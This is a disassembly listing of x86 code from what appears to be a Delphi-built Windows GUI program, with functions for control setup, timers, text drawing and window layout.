mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_442374
mov edx 0x32
mov eax esi
call sub_442398
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_431688
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_423f90
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_41900c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_41900c
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_41900c
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_424718
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_423f90
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_41900c
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_41900c
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_41900c
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_424718
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431778
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_423f90
mov ecx edi
mov edx esi
mov eax ebx
call sub_4246ec
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_42468c
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_4317b8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_42409c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_42406c
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_424050
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_423f90
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_42438c
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_42406c
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_424050
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_423f90
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_42438c
mov eax [ ebp - 0x4 ]
call sub_4425bc
push eax
mov eax [ ebp - 0x4 ]
call sub_442600
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_424750
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_4318aa ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_419034
lea eax [ ebp - 0x1c ]
call sub_431688
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_419034
lea eax [ ebp - 0x1c ]
call sub_431688
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_419034
lea eax [ ebp - 0x1c ]
call sub_431688
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_431778
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_431778
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_431778
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_431778
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_431778
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_431778
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_431778
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_431778
pop ecx
sub_431a40
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_420714
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_431ac8
call sub_421874
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_431a90
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_431b3c
mov eax [ esi + 0x34 ]
call sub_421928
mov edx ebx
and dl 0xfc
mov eax esi
call sub_420760
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_431ac8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_431b02
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403430
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431b3c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_431bbb
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431bc2
lea eax [ ebp - 0x4 ]
call sub_404008
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9c8
call sub_4039c0
sub_431c14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44b03c
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_433abc
call sub_433b9c
test al al
je r-xdata
add esp 0xfffffff0
call sub_403558
mov edx 0xb9
mov eax esi
call sub_442374
mov edx 0x29
mov eax esi
call sub_442398
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_432064
mov edx 0x1
mov eax esi
call sub_432080
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_442d58
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_44966c
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_431cd8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44622c
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_431d48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4489b8
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_446940
sub_431d88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_431e78
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_442bb8
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44787c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_431e7f
lea eax [ ebp - 0x14 ]
call sub_404008
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4493d8
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_4493d8
push eax
call InvalidateRect
sub_431e88
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_431ec0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_432022
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_431584
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_431e88
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_431584
mov esi [ ebx + 0x208 ]
call sub_433abc
call sub_433b9c
test al al
je r-xdata
push ebp
call sub_431e88
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_431584
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_424270
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_424614
mov eax ebx
call sub_44a5b8
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_444e98
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_442bb8
mov eax [ ebp - 0x1c ]
call sub_4044c8
push eax
mov eax esi
call sub_4249b8
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432029
lea eax [ ebp - 0x1c ]
call sub_404008
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_42438c
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_4248d8
mov edx r-xdata
mov eax esi
call sub_424834
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_4320d4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44540c
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_43212c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_448034
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_43224d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_448034
call sub_403a6c
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_442398
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_442374
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_432268
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_449f20
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_432294
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_44a5c0
pop esi
pop ebx
retn
sub_4322d4
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x24
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
and eax [ ebx ]
add [ ebx + eax * 2 ] ah
add [ edx + eax ] bl
add [ eax ] al
js r-xdata
dec eax
push ds
inc esp
add [ esi + ecx * 2 + 0x44 ] al
add [ eax + 0x4e ] dh
inc esp
add [ eax - 0x3fffbbd7 ] cl
pop ds
inc esp
add [ ebx + ebp ] dl
inc esp
add [ edx + ebp + 0x2da00044 ] cl
inc esp
add [ esp + ebp + 0x44 ] cl
add [ eax ] dl
lahf
inc ebx
add ah dh
dec esi
inc esp
add [ edx + edx * 4 ] cl
inc esp
add al cl
xchg edx eax
inc esp
add [ ebp + ecx * 4 - 0x6d53ffbc ] cl
inc esp
add [ esp + edx * 2 ] cl
inc esp
add [ eax + 0x4000445a ] ah
push 0xa8280044
inc ebx
add [ eax ] ch
inc esp
add [ eax - 0x27ffbc58 ] al
push 0x68dc0044
inc esp
add [ edi + 0x673c0044 ] dl
inc esp
add ah ch
xchg ebx eax
inc esp
add [ ecx + esi * 2 - 0x5a3fffbc ] al
inc esp
add [ eax ] dh
nop
inc esp
add [ eax - 0x6d ] bl
inc esp
add [ eax - 0x63ffbc5a ] bl
cmpsd [ esi ] [ edi ]
inc ebx
add [ ebx ] al
add [ ecx ] dl
mov ebp 0xffbaffbc
hlt
inc ebx
add [ eax - 0x77ffbdf2 ] bl
xor al 0x40
add al bl
pop es
inc edx
add [ eax + 0x18004034 ] dl
outsd
inc esp
add ah cl
xor [ eax ] eax
call 0xffffffffbc43634a
and al 0x43
add al dh
sahf
inc esp
add al ah
inc sp
add [ edx + ebp * 4 + 0x41 ] ah
add [ esp + ecx * 2 + 0x44 ] dh
add [ eax - 0x6bffbbe0 ] cl
push ebx
inc esp
add [ eax - 0x4fffbbd7 ] ah
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
add [ eax + 0x3800420e ] bh
cmpsb [ esi ] [ edi ]
inc ebx
add [ edx + ebx * 4 ] al
inc esp
add [ eax ] ah
lahf
inc esp
add [ esi + ebx * 4 + 0x44 ] ch
add ah bh
push ds
inc esp
add [ eax - 0x5fffbb6c ] al
xchg esp eax
inc esp
add [ eax + 0x44004491 ] al
push ds
inc esp
add [ eax + 0x1e ] cl
sub_432438
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_43a638
mov edx edi
mov eax [ esi + 0x210 ]
call sub_41a30c
xor edx edx
mov eax edi
call sub_442ad8
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_442d2c
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_432868
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_4324bc
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_41a604
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4451f0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4324f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_432559
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43a938
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_43255e
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_462838
call sub_403a3c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432584
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_448384
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403430
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_4325c4
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_4481cc
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403430
pop edx
pop esi
pop ebx
retn
sub_4325f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_438894
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_4328a0
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_432680
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_432914
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403234
mov eax [ esi + 0x210 ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b098
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_4326d0
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_423ab8
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_432859
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_4493d8
push eax
